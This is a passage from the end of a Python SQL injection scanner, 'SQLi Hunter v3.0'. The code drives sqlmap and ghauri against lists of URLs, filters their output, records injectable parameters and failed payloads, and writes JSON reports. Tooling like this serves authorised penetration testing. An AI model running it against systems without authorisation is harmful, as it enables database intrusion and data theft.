                        you\s+have\s+not|it\s+is\s+recommended|
                        searching|ignoring|it\s+looks\s+like|
                        testing\s+if\s+the\s+target|
                        testing\s+if\s+GET|testing\s+if\s+POST|
                        fetched\s+random)
          | \[INFO\]\s+testing\s+['"`]      # <-- ALL payload testing lines
          | \[WARNING\]\s*(reflective|turning\s+off|it\s+seems|
                           please\s+make|provide|GET\s+parameter|
                           POST\s+parameter.*not\s+appear|
                           heuristic.*might\s+not)
          | do\s+you\s+want\s+to
          | it\s+is\s+recommended
          | legal\s+disclaimer
          | ---\s*$
          | ^\s*$
          | ^_+$              # sqlmap banner underscores
          | ^\s*[|\\]\s*$     # sqlmap banner pipes/slashes
        )""",
        re.IGNORECASE | re.VERBOSE,
    ),
    "ghauri": re.compile(
        r"""(
            ^\[\*\]
          | \[INFO\]\s*(testing|using|target|fetching|reading|starting|ending|ghauri)
          | ghauri/[\d.]+
          | ^\s*$
        )""",
        re.IGNORECASE | re.VERBOSE,
    ),
}

def _parse_auto(raw: str, tool: str) -> dict:
    clean  = [ln.rstrip() for ln in raw.splitlines()
              if not _NOISE[tool].search(ln)]
    result = {"dbms": None, "injectable": [], "key_findings": [], "failed": []}
    cur_pl = None
    for ln in clean:
        ls = ln.strip()
        if re.search(r"(dbms|back.?end).*(is|appears|seems)", ls, re.I):
            result["dbms"] = ls
        if re.search(r"(parameter|param).*(injectable|vulnerable)", ls, re.I):
            result["injectable"].append(ls)
        if re.search(r"\[PAYLOAD\]", ls, re.I):
            cur_pl = ls
        if re.search(r"\b(4\d\d|5\d\d)\b", ls) and cur_pl:
            result["failed"].append({"payload": cur_pl, "error": ls})
            cur_pl = None
        if re.search(r"(is vulnerable|injection found|sql injection|found a)", ls, re.I):
            if ls not in result["key_findings"]:
                result["key_findings"].append(ls)
    if result["injectable"]:
        result["key_findings"] = result["injectable"] + result["key_findings"]
    return result

def _run_one_auto(tool, url, param, technique, profile, cfg, mode="basic") -> dict:
    # Separate log/session dirs per mode so basic and advanced don't collide
    log_dir  = cfg.output_dir / "raw_logs" / tool / mode
    log_dir.mkdir(parents=True, exist_ok=True)
    log_file = log_dir / f"{safe_name(url)}.txt"

    cmd = [tool, "-u", url] + list(profile)

    # Focus on confirmed technique
    if technique and technique in _TECH_MAP:
        cmd = [c if not c.startswith("--technique") else f"--technique={_TECH_MAP[technique]}"
               for c in cmd]

    if param:
        cmd += ["-p", param]

    if tool == "sqlmap":
        # Separate session dir per level so basic/advanced don't share state
        session_dir = log_dir / f"session_{safe_name(url)}"
        cmd += ["--output-dir", str(session_dir)]

    # POST body handling
    if cfg.method == "POST":
        if cfg.post_data:
            # User gave explicit body — use it, drop --forms to avoid CSRF confusion
            cmd = [c for c in cmd if c != "--forms"]
            cmd += ["--data", cfg.post_data]
        elif cfg.target_params:
            # Build minimal body from --param list
            body = "&".join(f"{p}=" for p in cfg.target_params)
            cmd = [c for c in cmd if c != "--forms"]
            cmd += ["--data", body]
        else:
            # No body known — let sqlmap discover forms
            pass
    else:
        # GET — drop --forms (not needed, avoids false form discovery)
        cmd = [c for c in cmd if c != "--forms"]

    for k, v in cfg.extra_headers.items():
        cmd += ["-H", f"{k}: {v}"]
    if cfg.cookies:
        cmd += ["--cookie", "; ".join(f"{k}={v}" for k, v in cfg.cookies.items())]
    if cfg.proxy:
        cmd += ["--proxy", cfg.proxy]

    info(f"  [{tool.upper()}/{mode}] {url}" + (f"  param={param}" if param else ""))
    if cfg.verbose:
        print(_c(DIM, f"  CMD: {' '.join(cmd)}"), flush=True)
    else:
        print(_c(DIM, f"  CMD: {tool} -u <url> {' '.join(a for a in cmd[3:] if not a.startswith('http'))}"), flush=True)

    # Streaming output
    all_lines: list[str] = []
    important_lines: list[str] = []  # lines we always print regardless of mode
    rc = 0

    # Lines that are always important regardless of noise filter
    _IMPORTANT = re.compile(
        r"(\[WARNING\]|\[CRITICAL\]|\[ERROR\]"
        r"|\binjectable\b|\bvulnerable\b|\binjection\b"
        r"|\bfound\b.*\binjection\b|\btime.based\b|\bblind\b"
        r"|\bparameter\b.*\bappears\b|\bback.end\b|\bDBMS\b"
        r"|\bpayload\b.*\bworking\b)",
        re.IGNORECASE,
    )

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, errors="replace",
            bufsize=1,
        )

        deadline = time.time() + cfg.auto_timeout

        for raw_line in proc.stdout:
            line = raw_line.rstrip()
            all_lines.append(line)

            if time.time() > deadline:
                proc.kill()
                warn(f"  [{tool.upper()}/{mode}] TIMEOUT after {cfg.auto_timeout}s")
                break

            stripped = line.strip()
            if not stripped:
                continue

            # Always print important lines
            if _IMPORTANT.search(line):
                print(_c(Y if "[WARNING]" in line else G, f"  │  {line}"), flush=True)
            # Print non-noise lines in dim
            elif not _NOISE[tool].search(line):
                print(_c(DIM, f"  │  {line}"), flush=True)

        proc.stdout.close()
        try:
            rc = proc.wait(timeout=10)
        except subprocess.TimeoutExpired:
            proc.kill()
            rc = -1

    except FileNotFoundError:
        err(f"  [{tool.upper()}] binary not in PATH")
        return {"url": url, "param": param, "status": "not_found",
                "key_findings": [], "failed": []}
    except Exception as exc:
        err(f"  [{tool.upper()}] error: {exc}")
        return {"url": url, "param": param, "status": "error",
                "key_findings": [], "failed": []}

    raw = "\n".join(all_lines)
    try:
        with open(log_file, "w") as fh:
            fh.write(f"CMD: {' '.join(cmd)}\nRC: {rc}\n{'='*60}\n{raw}")
    except Exception:
        pass

    if rc not in (0, 1) and rc > 0:
        warn(f"  [{tool.upper()}/{mode}] rc={rc}")

    parsed   = _parse_auto(raw, tool)
    has_vuln = bool(parsed["key_findings"] or parsed["injectable"] or parsed["dbms"])

    if has_vuln:
        vuln_print(url, param or "?", f"{tool.upper()} {mode}", "", "auto", False)
        for kf in parsed["key_findings"][:5]:
            dim(f"  {kf}")
        if parsed["dbms"]:
            dim(f"  DBMS: {parsed['dbms']}")
    else:
        info(f"  [{tool.upper()}/{mode}] no injection found on {url}")

    return {
        "url": url, "param": param, "technique": technique,
        "status": "vulnerable" if has_vuln else "clean",
        "dbms": parsed["dbms"],
        "key_findings": parsed["key_findings"],
        "failed": parsed["failed"],
    }

def run_auto(tool: str, mode: str, targets: list[tuple], cfg: ScanConfig):
    key = f"{tool}_{mode}"
    ts_set(key, "RUNNING")

    if not shutil.which(tool):
        warn(f"  {tool} not in PATH — skipping [{mode}]")
        ts_set(key, "SKIPPED", f"Binary not installed: pip install {tool}")
        return

    hdr(f"PHASE 2 — {tool.upper()}  [{mode.upper()}]")
    profile = (
        _SQLMAP_ADV   if tool == "sqlmap" and mode == "advanced" else
        _SQLMAP_BASIC if tool == "sqlmap" else
        _GHAURI_ADV   if mode == "advanced" else _GHAURI_BASIC
    )
    info(f"Targets: {len(targets)} | Mode: {mode}")
    vuln_count = 0
    all_failed = []

    # Run targets in parallel but pass mode so each gets its own session dir
    with ThreadPoolExecutor(max_workers=cfg.auto_threads,
                            thread_name_prefix=f"{tool}_{mode}") as ex:
        futs = [ex.submit(_run_one_auto, tool, u, p, t, profile, cfg, mode)
                for u, p, t in targets]
        for fut in as_completed(futs):
            try:
                res = fut.result()
                if res["status"] == "vulnerable":
                    vuln_count += 1
                    with _write_lock:
                        EVIDENCE[tool]["findings"].append(res)
                        RUN_FINDINGS[tool]["findings"].append(res)
                    _save_ev(cfg.output_dir / "evidence.json")
                if res.get("failed"):
                    all_failed.extend(res["failed"])
                    with _write_lock:
                        EVIDENCE[tool]["failed_payloads"].extend(res["failed"])
                        RUN_FINDINGS[tool]["failed_payloads"].extend(res["failed"])
                    _save_ev(cfg.output_dir / "evidence.json")
            except Exception as exc:
                errhdr(f"Auto worker [{tool}/{mode}]: {type(exc).__name__}: {exc}")

    if all_failed:
        fp   = cfg.output_dir / f"{tool}_{mode}_failed_payloads.txt"
        seen = set(fp.read_text().splitlines()) if fp.exists() else set()
        new  = []
        for item in all_failed:
            p = re.sub(r'\[PAYLOAD\]\s*', '', item.get("payload", ""), flags=re.I).strip()
            if p and p not in seen:
                new.append(p); seen.add(p)
        if new:
            with open(fp, "a") as fh:
                fh.write("\n".join(new) + "\n")
            info(f"Saved {len(new)} failed payloads → {fp}")

    ts_done(key, vuln_count)
    ok(f"{tool.upper()} [{mode}] done — {vuln_count} finding(s)")


# ═══════════════════════════════════════════════════════════════════════
#  PRE-FLIGHT
# ═══════════════════════════════════════════════════════════════════════
def preflight(mode: str, auto_level: str) -> bool:
    hdr("PRE-FLIGHT")
    ok("  requests library          found")
    if mode in ("auto", "full"):
        any_auto = False
        for t in ["sqlmap", "ghauri"]:
            path = shutil.which(t)
            if path:
                ok(f"  {t:<26} found  →  {path}")
                any_auto = True
            else:
                warn(f"  {t:<26} NOT FOUND — phase will be skipped")
                warn(f"     Install: pip install {t}")
        if not any_auto and mode == "auto":
            errhdr("mode=auto requires sqlmap or ghauri — neither found")
            return False
    ok("Pre-flight passed")
    return True


# ═══════════════════════════════════════════════════════════════════════
#  REPORT
# ═══════════════════════════════════════════════════════════════════════
def build_report(cfg: ScanConfig, run_meta: dict) -> tuple[Path, dict]:
    # Summary uses ONLY current run findings — no historical bleed
    cl = RUN_FINDINGS.get("checklist", {})
    sm = RUN_FINDINGS.get("sqlmap", {})
    gh = RUN_FINDINGS.get("ghauri", {})
    findings_list = cl.get("findings", [])

    by_tech: dict[str, int] = {}
    for f in findings_list:
        t = f.get("technique", "unknown")
        by_tech[t] = by_tech.get(t, 0) + 1

    summary = {
        "checklist_vuln_params" : len(findings_list),
        "checklist_clean_params": len(cl.get("clean", [])),
        "waf_flagged"           : len(cl.get("waf_flagged", [])),
        "by_technique"          : by_tech,
        "sqlmap_findings"       : len(sm.get("findings", [])),
        "sqlmap_failed_payloads": len(sm.get("failed_payloads", [])),
        "ghauri_findings"       : len(gh.get("findings", [])),
        "ghauri_failed_payloads": len(gh.get("failed_payloads", [])),
    }

    # Report JSON contains only this run's findings
    report = {
        "scan_metadata": run_meta,
        "tool_status"  : TOOL_STATUS,
        "summary"      : summary,
        "evidence"     : {
            "checklist": {
                "description": "Phase 1 — error/boolean/time/union per param",
                "findings"   : findings_list,
            },
            "sqlmap" : {"findings": sm.get("findings", [])},
            "ghauri" : {"findings": gh.get("findings", [])},
        },
    }
    ts    = run_meta.get("timestamp", "run")
    rpath = cfg.output_dir / f"report_{ts}.json"
    try:
        with open(rpath, "w") as fh:
            json.dump(report, fh, indent=2, ensure_ascii=False)
    except Exception as e:
        errhdr(f"Could not write report: {e}")
    return rpath, summary


def print_summary(rpath: Path, summary: dict, cfg: ScanConfig):
    hdr("SCAN COMPLETE")
    print(_c(C, f"  Report : {rpath}"))
    print(_c(C, f"  Folder : {cfg.output_dir}  ← results accumulate here\n"))

    print(_c(B, "  TOOL STATUS"))
    print(f"  {'─'*60}")
    sc_map = {"DONE": G, "ERROR": R, "SKIPPED": Y, "RUNNING": C, "WAITING": DIM}
    for k, v in sorted(TOOL_STATUS.items()):
        sc = sc_map.get(v.get("state", ""), "")
        n  = f"  [{v.get('findings','?')} findings]" if v.get("state") == "DONE" else ""
        d  = f"  ← {v['detail']}" if v.get("detail") and v.get("state") != "DONE" else ""
        print(f"  {k:<28} {_c(sc, v.get('state','?'))}{_c(G, n)}{_c(Y, d)}")

    if summary.get("by_technique"):
        print(f"\n  {_c(B,'TECHNIQUE BREAKDOWN')}")
        for tech, cnt in summary["by_technique"].items():
            print(f"    {tech:<24}: {_c(G, str(cnt))}")

    print(f"\n  {_c(B,'RESULTS SUMMARY')}")
    print(f"  {'─'*60}")
    rows = [
        ("Checklist  Vulnerable params",  "checklist_vuln_params"),
        ("Checklist  Clean params",        "checklist_clean_params"),
        ("WAF flagged",                    "waf_flagged"),
        ("SQLMap     Findings",            "sqlmap_findings"),
        ("SQLMap     Failed payloads",     "sqlmap_failed_payloads"),
        ("Ghauri     Findings",            "ghauri_findings"),
        ("Ghauri     Failed payloads",     "ghauri_failed_payloads"),
    ]
    for label, key in rows:
        v  = summary.get(key, 0)
        vc = _c(G, str(v)) if v and int(v) > 0 else _c(DIM, "0")
        print(f"  {label:<38}: {vc}")
    print(f"  {'─'*60}\n")


# ═══════════════════════════════════════════════════════════════════════
#  ARG PARSER
# ═══════════════════════════════════════════════════════════════════════
def _parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(
        prog="sqli_hunter.py",
        description="SQLi Hunter v3.0 — Checklist-based SQL injection scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES
─────────────────────────────────────────────────────────────
  python3 sqli_hunter.py -u urls.txt
  python3 sqli_hunter.py -U "https://target.com/page?id=1&cat=2"
  python3 sqli_hunter.py -u urls.txt --mode checklist
  python3 sqli_hunter.py -u urls.txt --mode full --auto-level advanced
  python3 sqli_hunter.py -u urls.txt --auto-on-all
  python3 sqli_hunter.py -u urls.txt --param id,search,q
  python3 sqli_hunter.py -U "https://t.com/api" --method POST --data "id=1&name=test"
  python3 sqli_hunter.py -u urls.txt -x http://127.0.0.1:8080 -H "Authorization: Bearer TOKEN"
  python3 sqli_hunter.py -u urls.txt --auto-level both --threads 10 --auto-threads 5
  python3 sqli_hunter.py -u urls.txt --sleep 10 --timeout 25 --time-margin 2000
─────────────────────────────────────────────────────────────
        """,
    )
    inp = ap.add_argument_group("Input")
    inp.add_argument("-U", "--url",    metavar="URL")
    inp.add_argument("-u", "--urls",   metavar="FILE")
    inp.add_argument("--method",       choices=["GET","POST"], default="GET")
    inp.add_argument("--data",         metavar="STR")
    inp.add_argument("--param",        metavar="LIST")
    inp.add_argument("--skip-param",   metavar="LIST")

    htp = ap.add_argument_group("HTTP")
    htp.add_argument("-H","--header",  metavar="K:V", action="append", default=[])
    htp.add_argument("-c","--cookie",  metavar="STR")
    htp.add_argument("-x","--proxy",   metavar="URL")
    htp.add_argument("--user-agent",   metavar="UA")
    htp.add_argument("--no-redirects", action="store_true")
    htp.add_argument("--verify-ssl",   action="store_true")
    htp.add_argument("--timeout",      type=int, default=15, metavar="SEC")
    htp.add_argument("--delay",        type=float, default=0.0, metavar="SEC")

    det = ap.add_argument_group("Detection")
    det.add_argument("--sleep",        type=int, default=5, metavar="SEC")
    det.add_argument("--time-margin",  type=int, default=1500, metavar="MS")
    det.add_argument("--test-headers", action="store_true")
    det.add_argument("--test-cookies", action="store_true")

    mod = ap.add_argument_group("Mode")
    mod.add_argument("--mode",         choices=["checklist","auto","full"], default="full")
    mod.add_argument("--auto-level",   choices=["basic","advanced","both"], default="basic")
    mod.add_argument("--auto-on-all",  action="store_true")

    con = ap.add_argument_group("Concurrency")
    con.add_argument("--threads",      type=int, default=5)
    con.add_argument("--auto-threads", type=int, default=3)
    con.add_argument("--auto-timeout", type=int, default=300, metavar="SEC")

    out = ap.add_argument_group("Output")
    out.add_argument("-o","--output",  metavar="DIR", default="sqli_results")
    out.add_argument("-v","--verbose", action="store_true")
    out.add_argument("--no-color",     action="store_true")

    return ap.parse_args()


# ═══════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════
def main():
    global EVIDENCE, RUN_FINDINGS, _no_color

    args = _parse_args()
    if args.no_color:
        _no_color = True

    out_dir = Path(args.output)
    out_dir.mkdir(exist_ok=True)

    # Load historical evidence (accumulates) + reset current-run tracker
    EVIDENCE = _load_ev(out_dir / "evidence.json")
    _init_run()   # RUN_FINDINGS starts clean every run

    urls: list[str] = []
    if args.url:
        urls.append(args.url.strip())
    if args.urls:
        p = Path(args.urls)
        if not p.exists():
            err(f"URL file not found: {args.urls}"); sys.exit(1)
        with open(p) as f:
            urls += [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
    if not urls:
        err("Provide -U <url> or -u <file>"); sys.exit(1)

    extra_headers: dict[str,str] = {}
    for h in (args.header or []):
        if ":" in h:
            k, _, v = h.partition(":")
            extra_headers[k.strip()] = v.strip()

    cookies: dict[str,str] = {}
    if args.cookie:
        for part in args.cookie.split(";"):
            part = part.strip()
            if "=" in part:
                k, _, v = part.partition("=")
                cookies[k.strip()] = v.strip()

    cfg = ScanConfig(
        urls             = urls,
        method           = args.method,
        post_data        = args.data or "",
        target_params    = [p.strip() for p in args.param.split(",")] if args.param else [],
        skip_params      = [p.strip() for p in args.skip_param.split(",")] if args.skip_param else [],
        extra_headers    = extra_headers,
        cookies          = cookies,
        proxy            = args.proxy or "",
        follow_redirects = not args.no_redirects,
        verify_ssl       = args.verify_ssl,
        timeout          = args.timeout,
        req_delay        = args.delay,
        sleep_sec        = args.sleep,
        time_margin_ms   = args.time_margin,
        test_headers     = args.test_headers,
        test_cookies     = args.test_cookies,
        mode             = args.mode,
        auto_level       = args.auto_level,
        auto_on_all      = args.auto_on_all,
        threads          = args.threads,
        auto_threads     = args.auto_threads,
        auto_timeout     = args.auto_timeout,
        output_dir       = out_dir,
        verbose          = args.verbose,
    )
    if args.user_agent:
        cfg.user_agent = args.user_agent

    banner(cfg.mode, cfg.auto_level, cfg.threads)
    if not preflight(cfg.mode, cfg.auto_level):
        sys.exit(1)

    info(f"URLs: {len(urls)} | Mode: {cfg.mode} | AutoLevel: {cfg.auto_level} | Threads: {cfg.threads}")
    info(f"Sleep: {cfg.sleep_sec}s | Timeout: {cfg.timeout}s | TimeMargin: {cfg.time_margin_ms}ms")
    info(f"Output: {out_dir}  (accumulates across runs)")

    ts       = datetime.now().strftime("%Y%m%d_%H%M%S")
    run_meta = {
        "timestamp": ts, "urls_count": len(urls),
        "mode": cfg.mode, "auto_level": cfg.auto_level,
        "method": cfg.method, "threads": cfg.threads,
        "sleep_sec": cfg.sleep_sec, "output_dir": str(out_dir),
    }
    EVIDENCE.setdefault("runs", []).append(run_meta)

    checklist_findings: list[Finding] = []
    if cfg.mode in ("checklist", "full"):
        checklist_findings = run_checklist(cfg)

    if cfg.mode in ("auto", "full"):
        # Build target list
        if cfg.auto_on_all or cfg.mode == "auto":
            # Scan all URLs
            auto_targets = [(u, None, None) for u in cfg.urls]
        elif cfg.mode == "full":
            # full = ALWAYS run Phase 2, regardless of Phase 1 results
            # Use confirmed params/techniques as hints if available, else scan all
            if checklist_findings:
                seen: set[tuple] = set()
                auto_targets = []
                for f in checklist_findings:
                    key_t = (f.url, f.param)
                    if key_t not in seen:
                        auto_targets.append((f.url, f.param, f.technique))
                        seen.add(key_t)
                info(f"Phase 2 targeting {len(auto_targets)} confirmed param(s) from Phase 1")
            else:
                # Checklist found nothing — still run Phase 2 on all URLs
                auto_targets = [(u, None, None) for u in cfg.urls]
                warn("Phase 1 found 0 vulns — Phase 2 will scan all URLs with no param hint")
        else:
            auto_targets = []

        if auto_targets:
            modes = ["basic", "advanced"] if cfg.auto_level == "both" else [cfg.auto_level]

            # Run basic THEN advanced sequentially for the same tool
            # to prevent session conflicts. Different tools run in parallel.
            def _run_tool_sequential(tool: str):
                for m in modes:
                    run_auto(tool, m, auto_targets, cfg)

            tools_available = [t for t in ["sqlmap", "ghauri"] if shutil.which(t)]
            if not tools_available:
                warn("No auto tools (sqlmap/ghauri) found in PATH — Phase 2 skipped")
            else:
                ex   = ThreadPoolExecutor(max_workers=len(tools_available),
                                          thread_name_prefix="auto_tool")
                futs = [ex.submit(_run_tool_sequential, t) for t in tools_available]
                for fut in as_completed(futs):
                    try:
                        fut.result()
                    except Exception as exc:
                        errhdr(f"Auto phase: {type(exc).__name__}: {exc}")
                ex.shutdown(wait=False)

    _save_ev(out_dir / "evidence.json")
    rpath, summary = build_report(cfg, run_meta)
    print_summary(rpath, summary, cfg)


if __name__ == "__main__":
    main()
